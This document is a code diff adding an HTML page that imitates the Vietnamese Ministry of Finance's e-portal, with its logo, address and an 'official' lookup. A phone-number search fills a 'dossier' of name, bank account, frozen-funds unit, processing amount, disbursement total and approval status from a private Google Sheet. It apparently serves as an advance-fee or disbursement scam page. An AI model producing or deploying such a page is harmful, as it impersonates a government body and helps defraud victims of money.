@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cổng Thông Tin Điện Tử Bộ Tài Chính</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background-color: #ffffff; 
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* BANNER PHÍA TRÊN */
+        .header-banner {
+            width: 100%;
+            height: 150px;
+            background-image: url("https://www.mof.gov.vn/api/mediafile/media-system/ff16d46a-56cb-409b-83e1-d392f376c80f.png");
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            position: relative;
+            border-bottom: 4px solid #ffca28;
+        }
+
+        .header-logo {
+            height: 110px;
+            width: auto;
+            margin-left: 50px;
+            z-index: 10;
+        }
+
+        .navbar { 
+            background-color: #0066b3; 
+            padding: 12px 0; 
+            display: flex; 
+            justify-content: center; 
+            gap: 5px;
+        }
+        .navbar a { 
+            color: white; 
+            text-decoration: none; 
+            font-size: 14px; 
+            font-weight: bold; 
+            padding: 8px 25px; 
+            text-transform: uppercase; 
+            border-right: 1px solid rgba(255,255,255,0.3); 
+        }
+        .navbar a:last-child { border: none; }
+
+        /* KHU VỰC TÌM KIẾM */
+        .search-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 50px 20px;
+        }
+        .search-wrapper {
+            width: 100%;
+            max-width: 1000px;
+            background: #004a80; 
+            padding: 60px 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .search-box { display: flex; justify-content: center; margin-bottom: 20px; }
+        .search-box input { 
+            width: 70%; 
+            padding: 20px; 
+            border: none;
+            border-radius: 8px 0 0 8px; 
+            outline: none; 
+            font-size: 20px; 
+        }
+        .search-box button { 
+            background: #002e50; 
+            color: white; 
+            border: none; 
+            padding: 0 50px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            border-radius: 0 8px 8px 0; 
+            font-size: 18px;
+            text-transform: uppercase;
+        }
+
+        /* VÙNG KẾT QUẢ CÓ HÌNH NỀN THEO YÊU CẦU */
+        #resultArea { 
+            max-width: 1100px; 
+            margin: 20px auto 100px auto; 
+            display: none; 
+            padding: 40px; 
+            position: relative;
+            background-color: #ffffff;
+            /* CHÈN HÌNH NỀN VÀO ĐÂY */
+            background-image: linear-gradient(rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.85)), 
+                              url("https://nqs.1cdn.vn/thumbs/1200x630/2024/09/11/anh-man-hinh-2024-09-11-luc-07.00.50.png");
+            background-size: cover;
+            background-position: center;
+            box-shadow: 0 0 30px rgba(0,0,0,0.15);
+            border: 1px solid #ddd;
+            border-radius: 12px;
+        }
+
+        .header-info { 
+            display: flex; 
+            justify-content: space-between; 
+            margin-bottom: 20px; 
+            padding-bottom: 15px;
+            border-bottom: 2px solid #0066b3;
+            line-height: 1.8;
+            font-size: 18px;
+        }
+        .main-table { width: 100%; border-collapse: collapse; background: transparent; }
+        .main-table td { border: 1px solid #c1d3e2; padding: 15px; font-size: 16px; }
+        .label-cell { background-color: #0066b3 !important; color: white !important; font-weight: bold; width: 25%; }
+        .content-cell { font-weight: bold; color: #000; background-color: rgba(255, 255, 255, 0.6); }
+        .header-blue-row { background-color: #0066b3 !important; color: white !important; font-weight: bold; text-transform: uppercase; }
+        .status-red { color: #d32f2f !important; font-weight: bold; }
+
+        /* FOOTER */
+        .footer { 
+            background-color: #00569d; 
+            color: white; 
+            padding: 40px 10%; 
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 30px;
+            border-top: 5px solid #ffca28;
+            margin-top: auto;
+        }
+        .footer-logo-circle {
+            width: 120px; height: 120px;
+            background: white; border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden; flex-shrink: 0;
+        }
+        .footer-logo-circle img { width: 90%; height: auto; }
+        .footer-info { text-align: left; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+<div class="header-banner">
+    <img src="https://upload.wikimedia.org/wikipedia/vi/d/d1/Logo_B%E1%BB%99_T%C3%A0i_ch%C3%ADnh.png" class="header-logo" alt="Logo Bộ Tài Chính">
+</div>
+
+<div class="navbar">
+    <a href="#">TRANG CHỦ</a>
+    <a href="#">GIỚI THIỆU</a>
+    <a href="#">DỊCH VỤ CÔNG</a>
+    <a href="#">TRA CỨU HỒ SƠ</a>
+    <a href="#">LIÊN HỆ</a>
+</div>
+
+<div class="search-container">
+    <div class="search-wrapper">
+        <div class="search-box">
+            <input type="text" id="phoneInput" placeholder="Nhập số điện thoại tra cứu hồ sơ...">
+            <button onclick="searchFromSheets()">TÌM KIẾM</button>
+        </div>
+        <div class="search-desc">Hệ thống tra cứu thông tin xét duyệt hồ sơ chính thức của Bộ Tài Chính.</div>
+    </div>
+</div>
+
+<div id="resultArea">
+    <div class="header-info">
+        <div>
+            Mã hồ sơ : <span id="resCodeTop" style="color: #0066b3; font-weight: bold;">---</span><br>
+            Họ và tên: <span id="resNameTop" style="font-weight: bold; text-transform: uppercase;">---</span><br>
+            Số tiền xử lý : <span id="resMoneyProc" style="color: #d32f2f; font-weight: bold;">---</span>
+        </div>
+        <div style="text-align:right">
+            Ngày ban hành : <span id="resDatePub" style="font-weight: bold;">---</span><br>
+            Ngày hết hạn : <span id="resDateEff" style="font-weight: bold;">---</span><br>
+            Trạng thái : <span class="status-red" id="resStatusTop">---</span>
+        </div>
+    </div>
+
+    <table class="main-table">
+        <tr class="header-blue-row">
+            <td style="color: white;">HỌ VÀ TÊN :</td>
+            <td id="resNameMain" colspan="3" style="color: white;">---</td>
+        </tr>
+        <tr>
+            <td class="label-cell">Số điện thoại :</td>
+            <td class="content-cell" id="resPhone">---</td>
+            <td class="label-cell">Số tài khoản :</td>
+            <td class="content-cell" id="resSTK">---</td>
+        </tr>
+        <tr>
+            <td class="label-cell">Đơn vị treo :</td>
+            <td class="content-cell" id="resDonVi">---</td>
+            <td class="label-cell">Ngân hàng thụ hưởng :</td>
+            <td class="content-cell" id="resBank">---</td>
+        </tr>
+        <tr>
+            <td class="label-cell">Nội dung yêu cầu :</td>
+            <td colspan="3" class="content-cell" id="resNote" style="height:120px; vertical-align:top;">---</td>
+        </tr>
+        <tr>
+            <td class="label-cell">TỔNG TIỀN GIẢI NGÂN</td>
+            <td colspan="3" class="content-cell" id="resTotal" style="font-size:32px; color:#d32f2f">---</td>
+        </tr>
+        <tr>
+            <td class="label-cell">Người ký</td>
+            <td class="content-cell" id="resSigner">---</td>
+            <td class="label-cell">Trạng thái phê duyệt</td>
+            <td class="content-cell status-red" id="resStatusBottom">---</td>
+        </tr>
+    </table>
+</div>
+
+<div class="footer">
+    <div class="footer-logo-circle">
+        <img src="https://upload.wikimedia.org/wikipedia/vi/d/d1/Logo_B%E1%BB%99_T%C3%A0i_ch%C3%ADnh.png" alt="Logo">
+    </div>
+    <div class="footer-info">
+        <p><strong>CỔNG THÔNG TIN ĐIỆN TỬ BỘ TÀI CHÍNH</strong></p>
+        <p>Địa chỉ: Số 28 Trần Hưng Đạo, Quận Hoàn Kiếm, Hà Nội</p>
+        <p>Điện thoại: (024) 2220.2828 | Cơ quan chủ quản: Bộ Tài chính</p>
+    </div>
+</div>
+
+<script>
+    const CSV_URL = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vQr04hb0YIkhxvuknfUDTyjSmpp0RespcJDtpUkkuu9yJQQUzRZpbprNY4acT35gXgJfHMdg_PALOwt/pub?gid=0&single=true&output=csv';
+
+    async function searchFromSheets() {
+        const inputVal = document.getElementById('phoneInput').value.trim();
+        if(!inputVal) { alert("Vui lòng nhập số điện thoại!"); return; }
+
+        try {
+            const resp = await fetch(CSV_URL + '&t=' + new Date().getTime());
+            const csvText = await resp.text();
+            const rows = csvText.split('\n').map(row => row.split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/).map(cell => cell.replace(/^"|"$/g, '').trim()));
+            const data = rows.find(r => r[0] === inputVal);
+
+            if(data) {
+                const formatVND = (val) => {
+                    if(!val) return "0 VND";
+                    let num = val.replace(/\D/g, '');
+                    return new Intl.NumberFormat('vi-VN').format(num) + " VND";
+                };
+
+                document.getElementById('resPhone').innerText   = data[0];
+                document.getElementById('resNameTop').innerText  = data[1];
+                document.getElementById('resNameMain').innerText = data[1];
+                document.getElementById('resMoneyProc').innerText= formatVND(data[2]);
+                document.getElementById('resTotal').innerText     = formatVND(data[3]);
+                document.getElementById('resCodeTop').innerText  = data[4];
+                document.getElementById('resSTK').innerText      = data[5];
+                document.getElementById('resBank').innerText     = data[6];
+                document.getElementById('resNote').innerText     = data[7];
+                document.getElementById('resStatusTop').innerText= data[8];
+                document.getElementById('resStatusBottom').innerText = data[8];
+                document.getElementById('resSigner').innerText   = data[9];
+                document.getElementById('resDatePub').innerText  = data[10];
+                document.getElementById('resDateEff').innerText  = data[11];
+                document.getElementById('resDonVi').innerText    = data[12];
+
+                document.getElementById('resultArea').style.display = 'block';
+                window.scrollTo({ top: document.getElementById('resultArea').offsetTop - 20, behavior: 'smooth' });
+            } else {
+                alert("Không tìm thấy thông tin hồ sơ cho số điện thoại này.");
+            }
+        } catch (e) {
+            alert("Lỗi kết nối dữ liệu.");
+        }
+    }
+</script>
+</body>
+</html>
